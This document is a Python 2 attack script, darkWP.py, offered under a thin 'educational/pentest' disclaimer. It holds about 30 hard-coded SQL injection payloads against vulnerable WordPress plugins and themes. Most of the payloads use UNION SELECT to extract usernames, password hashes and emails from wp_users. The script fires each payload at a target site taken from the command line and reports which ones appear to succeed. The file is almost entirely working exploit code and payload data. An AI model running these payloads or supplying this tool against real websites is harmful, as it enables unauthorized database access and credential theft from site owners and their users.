#!/usr/bin/python
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# Toolname        : darkWP.py
# Coder           : baltazar a.k.a b4ltazar < b4ltazar@gmail.com>
# Version         : 0.1
# greetz for all members of ex darkc0de.com, ljuska.org 
# 

import subprocess, sys, re, urllib2

W  = "\033[0m";  
R  = "\033[31m";  
O  = "\033[33m"; 
B  = "\033[34m";

sqls = ["wp-content/plugins/Calendar/front_end/spidercalendarbig_seemore.php?theme_id=5&ev_ids=1&calendar_id=null%20union%20all%20select%201,1,1,1,0x62616c74617a6172,1,1,1,1,1,1,1,1,1,1,1,1+--+&date=2012-10-10&many_sp_calendar=1&cur_page_url=",
        "wp-content/plugins/hd-webplayer/config.php?id=1+/*!UNION*/+/*!SELECT*/+1,2,3,0x62616c74617a6172,5,6,7",
        "wp-content/plugins/hd-webplayer/playlist.php?videoid=1+/*!UNION*/+/*!SELECT*/+0x62616c74617a6172,2,3,4,5,6,7",
        "index.php?cat=999%20UNION%20SELECT%20null,CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58)),null,null,null%20FROM%20wp_users/*",
	    "index.php?cat=%2527%20UNION%20SELECT%20CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58))%20FROM%20wp_users/*",
	    "index.php?exact=1&sentence=1&s=%b3%27)))/**/AND/**/ID=-1/**/UNION/**SELECT**/1,2,3,4,5,user_pass,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24/**/FROM/**/wp_users%23",
	    "index?page_id=115&forumaction=showprofile&user=1+union+select+null,concat(user_login,0x2f,user_pass,0x2f,user_email),null,null,null,null,null+from+wp_tbv_users/*",
	    "wp-content/plugins/wp-cal/functions/editevent.php?id=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6%20from%20wp_users--",
	    "wp-content/plugins/fgallery/fim_rss.php?album=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6,7%20from%20wp_users--",
	    "wp-content/plugins/wassup/spy.php?to_date=-1%20group%20by%20id%20union%20select%20null,null,null,conca(0x7c,user_login,0x7c,user_pass,0x7c),null,null,null,null,null,null,null,null%20%20from%20wp_users",
	    "wordspew-rss.php?id=-998877/**/UNION/**/SELECT/**/0,1,concat(0x7c,user_login,0x7c,user_pass,0x7c),concat(0x7c,user_login,0x7c,user_pass,0x7c),4,5/**/FROM/**/wp_users",
	    "wp-content/plugins/st_newsletter/shiftthis-preview.php?newsletter=-1/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users",
	    "sf-forum?forum=-99999/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	    "sf-forum?forum=-99999/**/UNION/**/SELECT/**/0,concat(0x7c,user_login,0x7c,user_pass,0x7c),0,0,0,0,0/**/FROM/**/wp_users/*",
	    "forums?forum=1&topic=-99999/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	    "index?page_id=2&album=S@BUN&photo=-333333%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/from%2F%2A%2A%2Fwp_users/**WHERE%20admin%201=%201",
	    "wp-download.php?dl_id=null/**/union/**/all/**/select/**/concat(user_login,0x3a,user_pass)/**/from/**/wp_users/*",
	    "wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain",
	    "wp-content/plugins/nextgen-smooth-gallery/nggSmoothFrame.php?galleryID=-99999/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	    "myLDlinker.php?url=-2/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	    "?page_id=2/&forum=all&value=9999+union+select+(select+concat_ws(0x3a,user_login,user_pass)+from+wp_users+LIMIT+0,1)--+&type=9&search=1&searchpage=2",
	    "wp-content/themes/limon/cplphoto.php?postid=-2+and+1=1+union+all+select+1,2,concat(user_login,0x3a,user_pass),4,5,6,7,8,9,10,11,12+from+wp_users--&id=2",
	    "?event_id=-99999/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	    "wp-content/plugins/photoracer/viewimg.php?id=-99999+union+select+0,1,2,3,4,user(),6,7,8/*",
	    "?page_id=2&id=-999+union+all+select+1,2,3,4,group_concat(user_login,0x3a,user_pass,0x3a,user_email),6+from+wp_users/*",
	    "wp-content/plugins/wp-forum/forum_feed.php?thread=-99999+union+select+1,2,3,concat(user_login,0x2f,user_pass,0x2f,user_email),5,6,7+from+wp_users/*",
	    "mediaHolder.php?id=-9999/**/UNION/**/SELECT/**/concat(User(),char(58),Version()),2,3,4,5,6,Database()--",
	    "wp-content/plugins/st_newsletter/stnl_iframe.php?newsletter=-9999+UNION+SELECT+concat(user_login,0x3a,user_pass,0x3a,user_email)+FROM+wp_users--",
	    "wp-content/plugins/wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain",
    	"wp-download.php?dl_id=null/**/union/**/all/**/select/**/concat(user_login,0x3a,user_pass)/**/from/**/wp_users/*",
        "wp-content/plugins/Calendar/front_end/spidercalendarbig_seemore.php?theme_id=5&ev_ids=1&calendar_id=null union all select 1,1,1,1,concat(user_login,0x3a,user_pass),1,1,1,1,1,1,1,1,1,1,1,1+from+wp_users+--+&date=2012-10-10&many_sp_calendar=1&cur_page_url="]


def logo():
	print R+"\n|---------------------------------------------------------------|"
        print "| b4ltazar[@]gmail[dot]com                                      |"
        print "|   10/2012     darkWP.py  v.0.1                                |"
        print "|              b4ltazar.us                                      |"
        print "|                                                               |"
        print "|---------------------------------------------------------------|\n"
	print W
        
    
if sys.platform == 'linux' or sys.platform == 'linux2':
    subprocess.call("clear", shell=True)
    logo()
else:
    subprocess.call("cls", shell=True)
    logo()
    
if len(sys.argv) != 2:
    print "[+] Usage: python darkWP.py [target]"
    print "[+] Thanks for using script, please visit http://b4ltazar.us"
    sys.exit(1)
    
target = sys.argv[1].replace("http://", "").rsplit("/",1)[0]
if target[-1] != "/":
    target = target+"/"
    
print R+"[!] Target:",target
print "[!] Sqli loaded:",len(sqls);print ""

for sql in sqls:
    print B+"[+] Checking: "+R+sql.replace("\n","")
    try:
        source = urllib2.urlopen("http://"+target+sql.replace("\n","")).read()
        if re.findall("baltazar", source) or re.findall("[a-f0-9]"*32, source):
            print R+"[!] w00t!,w00t! "+O+"http://"+target+sql.replace("\n","")+R+" SQLi Found"
    except(urllib2.HTTPError):
        pass
    except(KeyboardInterrupt, SystemExit):
        raise
        
print W+"\n[!] Done"
print "[+] Thanks for using script, please visit http://b4ltazar.us"

    
